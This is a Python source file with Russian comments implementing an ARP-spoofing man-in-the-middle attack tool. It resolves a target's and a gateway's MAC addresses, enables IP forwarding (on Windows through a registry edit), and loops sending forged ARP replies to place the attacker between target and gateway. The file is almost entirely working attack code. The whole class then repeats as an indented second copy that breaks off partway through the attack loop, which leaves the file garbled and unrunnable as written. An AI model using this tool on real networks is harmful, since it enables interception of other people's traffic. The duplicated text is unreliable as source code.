#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import platform
import time
import threading
import subprocess
import os
import sys
from typing import Optional, Dict
from utils import enable_ip_forwarding, disable_ip_forwarding


class MITMAttacker:
    def __init__(self, target_ip: str, gateway_ip: str, interface: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = False
        self.attack_thread = None
        self.spoofing = False

        # MAC адреса
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.attacker_mac: Optional[str] = None

        # Статистика
        self.spoof_packets_sent = 0
        self.start_time = 0

        # Проверяем наличие Npcap
        self.npcap_available = self._check_npcap()

        # Получаем MAC адреса
        self._get_macs()

    def _check_npcap(self) -> bool:
        """Проверить наличие Npcap/WinPcap с детектированием"""
        if platform.system() != "Windows":
            return True  # На Linux/Mac всегда доступно через libpcap

        try:
            # Попытка импортировать scapy для Windows
            from scapy.arch.windows import get_windows_if_list
            interfaces = get_windows_if_list()
            if interfaces and len(interfaces) > 0:
                print("[*] Npcap/WinPcap detected via Scapy")
                return True
        except ImportError:
            pass
        except Exception as e:
            print(f"[!] Error checking Npcap via Scapy: {e}")

        # Проверяем наличие DLL файлов Npcap
        npcap_paths = [
            os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32', 'wpcap.dll'),
            os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32', 'Packet.dll'),
            r"C:\Program Files\Npcap\wpcap.dll",
            r"C:\Program Files (x86)\Npcap\wpcap.dll",
            r"C:\Program Files\Npcap\Packet.dll",
            r"C:\Program Files (x86)\Npcap\Packet.dll"
        ]

        for path in npcap_paths:
            if os.path.exists(path):
                print(f"[*] Npcap DLL found at: {path}")
                return True

        print("[!] Npcap not found. MITM attacks will be limited.")
        print("[!] Install Npcap from: https://nmap.org/npcap/")
        return False

    def _get_macs(self):
        """Получить MAC адреса целевых устройств с улучшенной обработкой ошибок"""
        print(f"[*] Getting MAC addresses for target {self.target_ip} and gateway {self.gateway_ip}")

        if platform.system() == "Windows":
            self._get_macs_windows()
        else:
            self._get_macs_linux()

        # Проверяем результаты
        if not self.target_mac:
            print(f"[!] Failed to get MAC for target {self.target_ip}")
        if not self.gateway_mac:
            print(f"[!] Failed to get MAC for gateway {self.gateway_ip}")
        if not self.attacker_mac:
            print(f"[!] Failed to get local MAC address")

    def _get_macs_windows(self):
        """Получить MAC адреса на Windows"""
        try:
            # Сначала пробуем через ARP кэш
            self.target_mac = self._get_mac_from_arp_cache(self.target_ip)
            self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)

            # Если не нашли в ARP кэше и есть Npcap, используем Scapy
            if (not self.target_mac or not self.gateway_mac) and self.npcap_available:
                try:
                    from scapy.all import ARP, Ether, srp

                    if not self.target_mac:
                        self.target_mac = self._get_mac_with_scapy(self.target_ip)

                    if not self.gateway_mac:
                        self.gateway_mac = self._get_mac_with_scapy(self.gateway_ip)
                except Exception as e:
                    print(f"[!] Failed to get MAC with Scapy: {e}")

            # Получаем собственный MAC
            self.attacker_mac = self._get_local_mac_windows()

        except Exception as e:
            print(f"[!] Error getting MAC addresses on Windows: {e}")
            # Устанавливаем значения по умолчанию
            self.target_mac = self.target_mac or "00:00:00:00:00:00"
            self.gateway_mac = self.gateway_mac or "00:00:00:00:00:00"
            self.attacker_mac = self.attacker_mac or "00:00:00:00:00:00"

    def _get_macs_linux(self):
        """Получить MAC адреса на Linux/Mac"""
        try:
            from scapy.all import ARP, Ether, srp

            # Получаем MAC через Scapy
            self.target_mac = self._get_mac_with_scapy(self.target_ip)
            self.gateway_mac = self._get_mac_with_scapy(self.gateway_ip)

            # Получаем собственный MAC
            self._get_local_mac_linux()

        except Exception as e:
            print(f"[!] Error getting MAC addresses on Linux/Mac: {e}")
            # Резервные методы
            self.target_mac = self._get_mac_from_arp_cache(self.target_ip)
            self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)

            # Устанавливаем значения по умолчанию
            self.target_mac = self.target_mac or "00:00:00:00:00:00"
            self.gateway_mac = self.gateway_mac or "00:00:00:00:00:00"
            self.attacker_mac = self.attacker_mac or "00:00:00:00:00:00"

    def _get_mac_from_arp_cache(self, ip: str) -> Optional[str]:
        """Получить MAC адрес из ARP кэша (кроссплатформенный)"""
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    f"arp -a {ip}",
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )
            else:
                result = subprocess.check_output(
                    f"arp -n {ip}",
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )

            lines = result.split('\n')
            for line in lines:
                if ip in line:
                    # Ищем MAC адрес в строке
                    import re
                    mac_pattern = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
                    match = mac_pattern.search(line)
                    if match:
                        mac = match.group(0)
                        # Нормализуем формат
                        if '-' in mac:
                            mac = mac.replace('-', ':')
                        return mac.upper()

        except subprocess.TimeoutExpired:
            print(f"[!] ARP cache lookup timed out for {ip}")
        except Exception as e:
            # Тихий провал - это нормально
            pass

        return None

    def _get_mac_with_scapy(self, ip: str) -> Optional[str]:
        """Получить MAC адрес с использованием Scapy"""
        try:
            from scapy.all import ARP, Ether, srp

            # Создаем ARP запрос
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request

            # Отправляем с таймаутом
            answered_list = srp(
                arp_request_broadcast,
                timeout=2,
                verbose=False,
                iface=self.interface,
                retry=1
            )[0]

            if answered_list:
                return answered_list[0][1].hwsrc.upper()

        except Exception as e:
            print(f"[!] Scapy ARP request failed for {ip}: {e}")

        return None

    def _get_local_mac_windows(self) -> Optional[str]:
        """Получить локальный MAC адрес на Windows"""
        try:
            # Пробуем через getmac
            result = subprocess.check_output(
                "getmac /fo csv /nh",
                shell=True,
                text=True,
                stderr=subprocess.DEVNULL,
                timeout=2
            )

            lines = result.strip().split('\n')
            for line in lines:
                if line and ',' in line:
                    parts = line.split(',')
                    if len(parts) >= 3:
                        mac = parts[2].strip().replace('"', '').replace('-', ':')
                        if mac and mac != "00-00-00-00-00-00":
                            return mac.upper()

        except:
            pass

        # Резервный метод через ipconfig
        try:
            result = subprocess.check_output(
                "ipconfig /all",
                shell=True,
                text=True,
                stderr=subprocess.DEVNULL,
                timeout=2
            )

            lines = result.split('\n')
            current_section = ""
            for line in lines:
                if 'adapter' in line.lower() and ':' in line:
                    current_section = line.split(':')[0].strip()

                if 'physical address' in line.lower() and self.interface.lower() in current_section.lower():
                    parts = line.split(':')
                    if len(parts) > 1:
                        mac = parts[1].strip().replace('-', ':')
                        if mac and mac != "00-00-00-00-00-00":
                            return mac.upper()

        except:
            pass

        return "00:00:00:00:00:00"

    def _get_local_mac_linux(self):
        """Получить локальный MAC адрес на Linux/Mac"""
        try:
            # Linux
            mac_path = f"/sys/class/net/{self.interface}/address"
            if os.path.exists(mac_path):
                with open(mac_path, 'r') as f:
                    mac = f.read().strip()
                    if mac:
                        self.attacker_mac = mac.upper()
                        return
        except:
            pass

        # MacOS или fallback
        try:
            if platform.system() == "Darwin":  # macOS
                result = subprocess.check_output(
                    f"ifconfig {self.interface}",
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )

                import re
                mac_pattern = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
                match = mac_pattern.search(result)
                if match:
                    mac = match.group(0).replace('-', ':')
                    self.attacker_mac = mac.upper()
                    return
        except:
            pass

        self.attacker_mac = "00:00:00:00:00:00"

    def spoof(self, target_ip: str, spoof_ip: str, target_mac: Optional[str] = None):
        """Отправить поддельный ARP пакет с улучшенной обработкой ошибок"""
        if platform.system() == "Windows" and not self.npcap_available:
            print("[!] ARP spoofing requires Npcap on Windows")
            return False

        try:
            from scapy.all import ARP, send

            if not target_mac:
                target_mac = self._get_mac_with_scapy(target_ip)

            if not target_mac:
                # Пробуем получить из кэша
                target_mac = self._get_mac_from_arp_cache(target_ip)

            if target_mac:
                # Создаем ARP ответ (op=2) с подмененным IP
                arp_response = ARP(
                    op=2,  # ARP ответ
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip,
                    hwsrc=self.attacker_mac
                )

                # Отправляем пакет с таймаутом
                send(arp_response, verbose=False, iface=self.interface, timeout=1)
                self.spoof_packets_sent += 1
                return True
            else:
                print(f"[!] Failed to get MAC for {target_ip}")

        except ImportError:
            print("[!] Scapy not available for ARP spoofing")
        except Exception as e:
            print(f"[!] Error sending ARP spoof: {e}")

        return False

    def restore(self, target_ip: str, gateway_ip: str):
        """Восстановить ARP таблицы с улучшенной надежностью"""
        if platform.system() == "Windows" and not self.npcap_available:
            print("[!] ARP restoration requires Npcap on Windows")
            return False

        success = True

        try:
            from scapy.all import ARP, send

            # Получаем актуальные MAC адреса
            target_mac = self._get_mac_from_arp_cache(target_ip)
            gateway_mac = self._get_mac_from_arp_cache(gateway_ip)

            if not target_mac or not gateway_mac:
                print("[!] Could not get MACs for restoration, using cached values")
                target_mac = self.target_mac
                gateway_mac = self.gateway_mac

            if target_mac and gateway_mac:
                # Восстанавливаем ARP запись цели
                arp_target = ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=gateway_mac
                )

                # Восстанавливаем ARP запись шлюза
                arp_gateway = ARP(
                    op=2,
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip,
                    hwsrc=target_mac
                )

                # Отправляем по несколько пакетов для надежности
                try:
                    send(arp_target, count=4, verbose=False, iface=self.interface, timeout=2)
                except:
                    print("[!] Failed to restore target ARP")
                    success = False

                try:
                    send(arp_gateway, count=4, verbose=False, iface=self.interface, timeout=2)
                except:
                    print("[!] Failed to restore gateway ARP")
                    success = False

                return success

        except ImportError:
            print("[!] Scapy not available for ARP restoration")
        except Exception as e:
            print(f"[!] Error restoring ARP: {e}")

        return False

    def start_attack(self):
        """Запустить MITM атаку с улучшенным управлением и мониторингом"""
        if self.running:
            print("[!] Attack already running")
            return

        # Проверка валидности IP адресов
        def is_valid_ip(ip):
            import socket
            try:
                socket.inet_aton(ip)
                return True
            except socket.error:
                return False

        if not is_valid_ip(self.target_ip):
            print(f"[!] Invalid target IP: {self.target_ip}")
            return

        if not is_valid_ip(self.gateway_ip):
            print(f"[!] Invalid gateway IP: {self.gateway_ip}")
            return

        # Проверяем, что цель и шлюз разные
        if self.target_ip == self.gateway_ip:
            print("[!] Target and gateway cannot be the same")
            return

        # Проверяем MAC адреса
        if not self.target_mac:
            print(f"[!] Cannot determine MAC address for target {self.target_ip}")
            print("[!] Make sure target is online and reachable")
            return

        if not self.gateway_mac:
            print(f"[!] Cannot determine MAC address for gateway {self.gateway_ip}")
            print("[!] Make sure gateway is reachable")
            return

        if platform.system() == "Windows" and not self.npcap_available:
            print("[!] MITM attacks not available on Windows without Npcap")
            print("[!] Install Npcap from https://nmap.org/npcap/ for full functionality")
            print("[!] Running in demonstration mode only")

            self.running = True
            self.spoofing = True
            self.start_time = time.time()

            # В демо-режиме просто показываем сообщения
            print(f"[*] Demonstration: MITM attack would target {self.target_ip} via {self.gateway_ip}")
            print("[*] This is a simulation - install Npcap for real MITM attacks")

            try:
                while self.running:
                    time.sleep(2)
                    duration = time.time() - self.start_time
                    print(f"[*] Simulation: MITM active for {duration:.1f}s")

            except KeyboardInterrupt:
                print("\n[*] Demo interrupted by user")
                self.stop_attack()
            except Exception as e:
                print(f"[!] Error in MITM simulation: {e}")
                self.stop_attack()

            return

        # Включаем IP forwarding (только на Linux)
        ip_forwarding_enabled = False
        if platform.system() != "Windows":
            if enable_ip_forwarding():
                print("[*] IP forwarding enabled")
                ip_forwarding_enabled = True
            else:
                print("[!] Failed to enable IP forwarding. Attack may not work properly.")
        else:
            # На Windows включаем IP forwarding через реестр
            try:
                subprocess.run(
                    r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
                    '/v IPEnableRouter /t REG_DWORD /d 1 /f',
                    shell=True, check=True, timeout=5
                )
                print("[*] IP forwarding enabled on Windows (requires restart for some versions)")
                ip_forwarding_enabled = True
            except subprocess.TimeoutExpired:
                print("[!] Timeout enabling IP forwarding on Windows")
            except Exception as e:
                print(f"[!] Failed to enable IP forwarding on Windows: {e}")

        self.running = True
        self.spoofing = True
        self.start_time = time.time()
        self.spoof_packets_sent = 0

        print(f"[*] Starting MITM attack: {self.target_ip} -> {self.gateway_ip}")
        print(f"[*] Target MAC: {self.target_mac}")
        print(f"[*] Gateway MAC: {self.gateway_mac}")
        print(f"[*] Your MAC: {self.attacker_mac}")
        print(f"[*] Interface: {self.interface}")
        print("[*] Press Ctrl+C to stop")

        last_stats_time = time.time()
        packets_per_second = 0

        try:
            while self.running:
                try:
                    # Спуфим цель, что мы шлюз
                    success1 = self.spoof(self.target_ip, self.gateway_ip, self.target_mac)

                    # Спуфим шлюз, что мы цель
                    success2 = self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)

                    # Статистика
                    current_time = time.time()
                    if current_time - last_stats_time >= 5:  # Каждые 5 секунд
                        duration = current_time - self.start_time
                        pps = self.spoof_packets_sent / duration if duration > 0 else 0
                        print(f"[*] MITM active for {duration:.1f}s, packets sent: {self.spoof_packets_sent} ({pps:.1f} pps)")
                        last_stats_time = current_time

                    time.sleep(2)  # Интервал между отправкой ARP пакетов

                except KeyboardInterrupt:
                    print("\n[*] Interrupted by user")
                    break
                except Exception as e:
                    print(f"[!] Error in spoofing loop: {e}")
                    # Продолжаем попытки
                    time.sleep(5)

        except Exception as e:
            print(f"[!] Critical error in MITM attack: {e}")
        finally:
            self.stop_attack(ip_forwarding_enabled)

    def stop_attack(self, ip_forwarding_enabled: bool = False):
        """Остановить атаку и восстановить сеть"""
        if not self.running:
            return

        print("\n[*] Stopping MITM attack...")

        self.running = False
        self.spoofing = False

        # Даем время завершиться потоку атаки
        time.sleep(0.5)

        # Восстанавливаем ARP таблицы
        print("[*] Restoring ARP tables...")
        restore_success = False

        if platform.system() == "Windows":
            if self.npcap_available:
                restore_success = self.restore(self.target_ip, self.gateway_ip)
            else:
                print("[*] Skipping ARP restoration (Npcap not available)")
        else:
            restore_success = self.restore(self.target_ip, self.gateway_ip)

        if restore_success:
            print("[*] ARP tables restored successfully")
        else:
            print("[!] Failed to restore ARP tables completely")

        # Выключаем IP forwarding
        print("[*] Disabling IP forwarding...")
        if platform.system() != "Windows":
            disable_ip_forwarding()
        else:
            # На Windows отключаем IP forwarding
            try:
                subprocess.run(
                    r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
                    '/v IPEnableRouter /t REG_DWORD /d 0 /f',
                    shell=True, check=True, timeout=5
                )
                print("[*] IP forwarding disabled on Windows")
            except Exception as e:
                print(f"[!] Failed to disable IP forwarding on Windows: {e}")

        # Выводим статистику
        duration = time.time() - self.start_time if self.start_time > 0 else 0
        print(f"[*] Attack duration: {duration:.1f} seconds")
        print(f"[*] ARP packets sent: {self.spoof_packets_sent}")
        print(f"[*] Average rate: {self.spoof_packets_sent/duration:.1f} pps" if duration > 0 else "[*] Average rate: N/A")
        print("[*] Network should be restored")

    def get_status(self) -> Dict:
        """Получить статус атаки"""
        current_time = time.time()
        duration = current_time - self.start_time if self.start_time > 0 else 0

        return {
            "running": self.running,
            "spoofing": self.spoofing,
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "target_mac": self.target_mac,
            "gateway_mac": self.gateway_mac,
            "attacker_mac": self.attacker_mac,
            "spoof_packets_sent": self.spoof_packets_sent,
            "duration": duration,
            "interface": self.interface,
            "npcap_available": self.npcap_available,
            "packets_per_second": self.spoof_packets_sent / duration if duration > 0 else 0
        }#!/usr/bin/env python3
        # -*- coding: utf-8 -*-

        import platform
        import time
        import threading
        import subprocess
        import os
        import sys
        from typing import Optional, Dict
        from utils import enable_ip_forwarding, disable_ip_forwarding


        class MITMAttacker:
            def __init__(self, target_ip: str, gateway_ip: str, interface: str):
                self.target_ip = target_ip
                self.gateway_ip = gateway_ip
                self.interface = interface
                self.running = False
                self.attack_thread = None
                self.spoofing = False

                # MAC адреса
                self.target_mac: Optional[str] = None
                self.gateway_mac: Optional[str] = None
                self.attacker_mac: Optional[str] = None

                # Статистика
                self.spoof_packets_sent = 0
                self.start_time = 0

                # Проверяем наличие Npcap
                self.npcap_available = self._check_npcap()

                # Получаем MAC адреса
                self._get_macs()

            def _check_npcap(self) -> bool:
                """Проверить наличие Npcap/WinPcap с детектированием"""
                if platform.system() != "Windows":
                    return True  # На Linux/Mac всегда доступно через libpcap

                try:
                    # Попытка импортировать scapy для Windows
                    from scapy.arch.windows import get_windows_if_list
                    interfaces = get_windows_if_list()
                    if interfaces and len(interfaces) > 0:
                        print("[*] Npcap/WinPcap detected via Scapy")
                        return True
                except ImportError:
                    pass
                except Exception as e:
                    print(f"[!] Error checking Npcap via Scapy: {e}")

                # Проверяем наличие DLL файлов Npcap
                npcap_paths = [
                    os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32', 'wpcap.dll'),
                    os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32', 'Packet.dll'),
                    r"C:\Program Files\Npcap\wpcap.dll",
                    r"C:\Program Files (x86)\Npcap\wpcap.dll",
                    r"C:\Program Files\Npcap\Packet.dll",
                    r"C:\Program Files (x86)\Npcap\Packet.dll"
                ]

                for path in npcap_paths:
                    if os.path.exists(path):
                        print(f"[*] Npcap DLL found at: {path}")
                        return True

                print("[!] Npcap not found. MITM attacks will be limited.")
                print("[!] Install Npcap from: https://nmap.org/npcap/")
                return False

            def _get_macs(self):
                """Получить MAC адреса целевых устройств с улучшенной обработкой ошибок"""
                print(f"[*] Getting MAC addresses for target {self.target_ip} and gateway {self.gateway_ip}")

                if platform.system() == "Windows":
                    self._get_macs_windows()
                else:
                    self._get_macs_linux()

                # Проверяем результаты
                if not self.target_mac:
                    print(f"[!] Failed to get MAC for target {self.target_ip}")
                if not self.gateway_mac:
                    print(f"[!] Failed to get MAC for gateway {self.gateway_ip}")
                if not self.attacker_mac:
                    print(f"[!] Failed to get local MAC address")

            def _get_macs_windows(self):
                """Получить MAC адреса на Windows"""
                try:
                    # Сначала пробуем через ARP кэш
                    self.target_mac = self._get_mac_from_arp_cache(self.target_ip)
                    self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)

                    # Если не нашли в ARP кэше и есть Npcap, используем Scapy
                    if (not self.target_mac or not self.gateway_mac) and self.npcap_available:
                        try:
                            from scapy.all import ARP, Ether, srp

                            if not self.target_mac:
                                self.target_mac = self._get_mac_with_scapy(self.target_ip)

                            if not self.gateway_mac:
                                self.gateway_mac = self._get_mac_with_scapy(self.gateway_ip)
                        except Exception as e:
                            print(f"[!] Failed to get MAC with Scapy: {e}")

                    # Получаем собственный MAC
                    self.attacker_mac = self._get_local_mac_windows()

                except Exception as e:
                    print(f"[!] Error getting MAC addresses on Windows: {e}")
                    # Устанавливаем значения по умолчанию
                    self.target_mac = self.target_mac or "00:00:00:00:00:00"
                    self.gateway_mac = self.gateway_mac or "00:00:00:00:00:00"
                    self.attacker_mac = self.attacker_mac or "00:00:00:00:00:00"

            def _get_macs_linux(self):
                """Получить MAC адреса на Linux/Mac"""
                try:
                    from scapy.all import ARP, Ether, srp

                    # Получаем MAC через Scapy
                    self.target_mac = self._get_mac_with_scapy(self.target_ip)
                    self.gateway_mac = self._get_mac_with_scapy(self.gateway_ip)

                    # Получаем собственный MAC
                    self._get_local_mac_linux()

                except Exception as e:
                    print(f"[!] Error getting MAC addresses on Linux/Mac: {e}")
                    # Резервные методы
                    self.target_mac = self._get_mac_from_arp_cache(self.target_ip)
                    self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)

                    # Устанавливаем значения по умолчанию
                    self.target_mac = self.target_mac or "00:00:00:00:00:00"
                    self.gateway_mac = self.gateway_mac or "00:00:00:00:00:00"
                    self.attacker_mac = self.attacker_mac or "00:00:00:00:00:00"

            def _get_mac_from_arp_cache(self, ip: str) -> Optional[str]:
                """Получить MAC адрес из ARP кэша (кроссплатформенный)"""
                try:
                    if platform.system() == "Windows":
                        result = subprocess.check_output(
                            f"arp -a {ip}",
                            shell=True,
                            text=True,
                            stderr=subprocess.DEVNULL,
                            timeout=2
                        )
                    else:
                        result = subprocess.check_output(
                            f"arp -n {ip}",
                            shell=True,
                            text=True,
                            stderr=subprocess.DEVNULL,
                            timeout=2
                        )

                    lines = result.split('\n')
                    for line in lines:
                        if ip in line:
                            # Ищем MAC адрес в строке
                            import re
                            mac_pattern = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
                            match = mac_pattern.search(line)
                            if match:
                                mac = match.group(0)
                                # Нормализуем формат
                                if '-' in mac:
                                    mac = mac.replace('-', ':')
                                return mac.upper()

                except subprocess.TimeoutExpired:
                    print(f"[!] ARP cache lookup timed out for {ip}")
                except Exception as e:
                    # Тихий провал - это нормально
                    pass

                return None

            def _get_mac_with_scapy(self, ip: str) -> Optional[str]:
                """Получить MAC адрес с использованием Scapy"""
                try:
                    from scapy.all import ARP, Ether, srp

                    # Создаем ARP запрос
                    arp_request = ARP(pdst=ip)
                    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_request_broadcast = broadcast / arp_request

                    # Отправляем с таймаутом
                    answered_list = srp(
                        arp_request_broadcast,
                        timeout=2,
                        verbose=False,
                        iface=self.interface,
                        retry=1
                    )[0]

                    if answered_list:
                        return answered_list[0][1].hwsrc.upper()

                except Exception as e:
                    print(f"[!] Scapy ARP request failed for {ip}: {e}")

                return None

            def _get_local_mac_windows(self) -> Optional[str]:
                """Получить локальный MAC адрес на Windows"""
                try:
                    # Пробуем через getmac
                    result = subprocess.check_output(
                        "getmac /fo csv /nh",
                        shell=True,
                        text=True,
                        stderr=subprocess.DEVNULL,
                        timeout=2
                    )

                    lines = result.strip().split('\n')
                    for line in lines:
                        if line and ',' in line:
                            parts = line.split(',')
                            if len(parts) >= 3:
                                mac = parts[2].strip().replace('"', '').replace('-', ':')
                                if mac and mac != "00-00-00-00-00-00":
                                    return mac.upper()

                except:
                    pass

                # Резервный метод через ipconfig
                try:
                    result = subprocess.check_output(
                        "ipconfig /all",
                        shell=True,
                        text=True,
                        stderr=subprocess.DEVNULL,
                        timeout=2
                    )

                    lines = result.split('\n')
                    current_section = ""
                    for line in lines:
                        if 'adapter' in line.lower() and ':' in line:
                            current_section = line.split(':')[0].strip()

                        if 'physical address' in line.lower() and self.interface.lower() in current_section.lower():
                            parts = line.split(':')
                            if len(parts) > 1:
                                mac = parts[1].strip().replace('-', ':')
                                if mac and mac != "00-00-00-00-00-00":
                                    return mac.upper()

                except:
                    pass

                return "00:00:00:00:00:00"

            def _get_local_mac_linux(self):
                """Получить локальный MAC адрес на Linux/Mac"""
                try:
                    # Linux
                    mac_path = f"/sys/class/net/{self.interface}/address"
                    if os.path.exists(mac_path):
                        with open(mac_path, 'r') as f:
                            mac = f.read().strip()
                            if mac:
                                self.attacker_mac = mac.upper()
                                return
                except:
                    pass

                # MacOS или fallback
                try:
                    if platform.system() == "Darwin":  # macOS
                        result = subprocess.check_output(
                            f"ifconfig {self.interface}",
                            shell=True,
                            text=True,
                            stderr=subprocess.DEVNULL,
                            timeout=2
                        )

                        import re
                        mac_pattern = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
                        match = mac_pattern.search(result)
                        if match:
                            mac = match.group(0).replace('-', ':')
                            self.attacker_mac = mac.upper()
                            return
                except:
                    pass

                self.attacker_mac = "00:00:00:00:00:00"

            def spoof(self, target_ip: str, spoof_ip: str, target_mac: Optional[str] = None):
                """Отправить поддельный ARP пакет с улучшенной обработкой ошибок"""
                if platform.system() == "Windows" and not self.npcap_available:
                    print("[!] ARP spoofing requires Npcap on Windows")
                    return False

                try:
                    from scapy.all import ARP, send

                    if not target_mac:
                        target_mac = self._get_mac_with_scapy(target_ip)

                    if not target_mac:
                        # Пробуем получить из кэша
                        target_mac = self._get_mac_from_arp_cache(target_ip)

                    if target_mac:
                        # Создаем ARP ответ (op=2) с подмененным IP
                        arp_response = ARP(
                            op=2,  # ARP ответ
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=spoof_ip,
                            hwsrc=self.attacker_mac
                        )

                        # Отправляем пакет с таймаутом
                        send(arp_response, verbose=False, iface=self.interface, timeout=1)
                        self.spoof_packets_sent += 1
                        return True
                    else:
                        print(f"[!] Failed to get MAC for {target_ip}")

                except ImportError:
                    print("[!] Scapy not available for ARP spoofing")
                except Exception as e:
                    print(f"[!] Error sending ARP spoof: {e}")

                return False

            def restore(self, target_ip: str, gateway_ip: str):
                """Восстановить ARP таблицы с улучшенной надежностью"""
                if platform.system() == "Windows" and not self.npcap_available:
                    print("[!] ARP restoration requires Npcap on Windows")
                    return False

                success = True

                try:
                    from scapy.all import ARP, send

                    # Получаем актуальные MAC адреса
                    target_mac = self._get_mac_from_arp_cache(target_ip)
                    gateway_mac = self._get_mac_from_arp_cache(gateway_ip)

                    if not target_mac or not gateway_mac:
                        print("[!] Could not get MACs for restoration, using cached values")
                        target_mac = self.target_mac
                        gateway_mac = self.gateway_mac

                    if target_mac and gateway_mac:
                        # Восстанавливаем ARP запись цели
                        arp_target = ARP(
                            op=2,
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=gateway_ip,
                            hwsrc=gateway_mac
                        )

                        # Восстанавливаем ARP запись шлюза
                        arp_gateway = ARP(
                            op=2,
                            pdst=gateway_ip,
                            hwdst=gateway_mac,
                            psrc=target_ip,
                            hwsrc=target_mac
                        )

                        # Отправляем по несколько пакетов для надежности
                        try:
                            send(arp_target, count=4, verbose=False, iface=self.interface, timeout=2)
                        except:
                            print("[!] Failed to restore target ARP")
                            success = False

                        try:
                            send(arp_gateway, count=4, verbose=False, iface=self.interface, timeout=2)
                        except:
                            print("[!] Failed to restore gateway ARP")
                            success = False

                        return success

                except ImportError:
                    print("[!] Scapy not available for ARP restoration")
                except Exception as e:
                    print(f"[!] Error restoring ARP: {e}")

                return False

            def start_attack(self):
                """Запустить MITM атаку с улучшенным управлением и мониторингом"""
                if self.running:
                    print("[!] Attack already running")
                    return

                # Проверка валидности IP адресов
                def is_valid_ip(ip):
                    import socket
                    try:
                        socket.inet_aton(ip)
                        return True
                    except socket.error:
                        return False

                if not is_valid_ip(self.target_ip):
                    print(f"[!] Invalid target IP: {self.target_ip}")
                    return

                if not is_valid_ip(self.gateway_ip):
                    print(f"[!] Invalid gateway IP: {self.gateway_ip}")
                    return

                # Проверяем, что цель и шлюз разные
                if self.target_ip == self.gateway_ip:
                    print("[!] Target and gateway cannot be the same")
                    return

                # Проверяем MAC адреса
                if not self.target_mac:
                    print(f"[!] Cannot determine MAC address for target {self.target_ip}")
                    print("[!] Make sure target is online and reachable")
                    return

                if not self.gateway_mac:
                    print(f"[!] Cannot determine MAC address for gateway {self.gateway_ip}")
                    print("[!] Make sure gateway is reachable")
                    return

                if platform.system() == "Windows" and not self.npcap_available:
                    print("[!] MITM attacks not available on Windows without Npcap")
                    print("[!] Install Npcap from https://nmap.org/npcap/ for full functionality")
                    print("[!] Running in demonstration mode only")

                    self.running = True
                    self.spoofing = True
                    self.start_time = time.time()

                    # В демо-режиме просто показываем сообщения
                    print(f"[*] Demonstration: MITM attack would target {self.target_ip} via {self.gateway_ip}")
                    print("[*] This is a simulation - install Npcap for real MITM attacks")

                    try:
                        while self.running:
                            time.sleep(2)
                            duration = time.time() - self.start_time
                            print(f"[*] Simulation: MITM active for {duration:.1f}s")

                    except KeyboardInterrupt:
                        print("\n[*] Demo interrupted by user")
                        self.stop_attack()
                    except Exception as e:
                        print(f"[!] Error in MITM simulation: {e}")
                        self.stop_attack()

                    return

                # Включаем IP forwarding (только на Linux)
                ip_forwarding_enabled = False
                if platform.system() != "Windows":
                    if enable_ip_forwarding():
                        print("[*] IP forwarding enabled")
                        ip_forwarding_enabled = True
                    else:
                        print("[!] Failed to enable IP forwarding. Attack may not work properly.")
                else:
                    # На Windows включаем IP forwarding через реестр
                    try:
                        subprocess.run(
                            r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
                            '/v IPEnableRouter /t REG_DWORD /d 1 /f',
                            shell=True, check=True, timeout=5
                        )
                        print("[*] IP forwarding enabled on Windows (requires restart for some versions)")
                        ip_forwarding_enabled = True
                    except subprocess.TimeoutExpired:
                        print("[!] Timeout enabling IP forwarding on Windows")
                    except Exception as e:
                        print(f"[!] Failed to enable IP forwarding on Windows: {e}")

                self.running = True
                self.spoofing = True
                self.start_time = time.time()
                self.spoof_packets_sent = 0

                print(f"[*] Starting MITM attack: {self.target_ip} -> {self.gateway_ip}")
                print(f"[*] Target MAC: {self.target_mac}")
                print(f"[*] Gateway MAC: {self.gateway_mac}")
                print(f"[*] Your MAC: {self.attacker_mac}")
                print(f"[*] Interface: {self.interface}")
                print("[*] Press Ctrl+C to stop")

                last_stats_time = time.time()
                packets_per_second = 0

                try:
                    while self.running:
                        try:
                            # Спуфим цель, что мы шлюз
                            success1 = self.spoof(self.target_ip, self.gateway_ip, self.target_mac)

                            # Спуфим шлюз, что мы цель
                            success2 = self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)

                            # Статистика
                            current_time = time.time()
                            if current_time - last_stats_time >= 5:  # Каждые 5 секунд
                                duration = current_time - self.start_time
